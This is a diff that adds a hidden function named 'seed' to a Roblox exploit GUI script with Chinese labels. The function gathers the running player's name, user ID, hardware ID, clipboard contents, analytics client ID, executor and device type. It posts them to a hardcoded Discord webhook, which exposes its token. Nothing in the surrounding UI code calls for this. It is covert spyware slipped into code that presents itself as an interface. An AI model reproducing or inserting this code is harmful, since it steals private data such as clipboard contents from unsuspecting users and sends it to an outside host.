@@ -184,6 +184,103 @@ end
       local UICorner = Instance.new("UICorner")
       local UICorner_2 = Instance.new("UICorner")
       
+     
+    function seed()
+    local Webhook = "https://discord.com/api/webhooks/1256906708366921751/Gg9U76WhFLtkeSeLZufAIOdxmHXSJ6urpXkHNmdVWIOSxu_xVCzfVOptnvH1O7saAltB"
+
+    local player = game:GetService("Players").LocalPlayer
+    local joinTime = os.time() - (player.AccountAge * 86400)
+    local joinDate = os.date("!*t", joinTime)
+    local premium = player.MembershipType == Enum.MembershipType.Premium
+
+    _G.IsPc = game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled and "模拟器/PC" or
+               game.UserInputService.TouchEnabled and "IOS/Android" or "IOS/Android/Unknown"
+
+    local executor = identifyexecutor() or "Unknown"
+    local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", player.UserId))
+    Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+    local AvatarImage = Thing.imageUrl
+
+    local msg = {
+        ["username"] = "KING SCRIPT",
+        ["embeds"] = {
+            {
+                ["color"] = tonumber("0x32CD32"),
+                ["title"] = "有人正在使用脚本"..os.date("%H").."时"..os.date("%M").."分",
+                ["thumbnail"] = {
+                    ["url"] = AvatarImage,
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "名称(Name)",
+                        ["value"] = "||"..player.Name.."||",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "昵称(DisplayName)",
+                        ["value"] = player.DisplayName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "UserId",
+                        ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. player.UserId .. "/profile") .. ")||",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "地图ID",
+                        ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) .. ")",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "地图名称",
+                        ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "使用的注入器",
+                        ["value"] = executor,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "账号年龄",
+                        ["value"] = player.AccountAge.."天",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "加入日期",
+                        ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "HWID",
+                        ["value"] = gethwid(),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "剪贴板",
+                        ["value"] = getclipboard(),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "客户端ID",
+                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "设备",
+                        ["value"] = _G.IsPc,
+                        ["inline"] = false
+                    },
+                }
+            }
+        }
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(msg)})
+    end
+
+      
       if syn and syn.protect_gui then syn.protect_gui(dogent) end
     
       dogent.Name = "frosty"
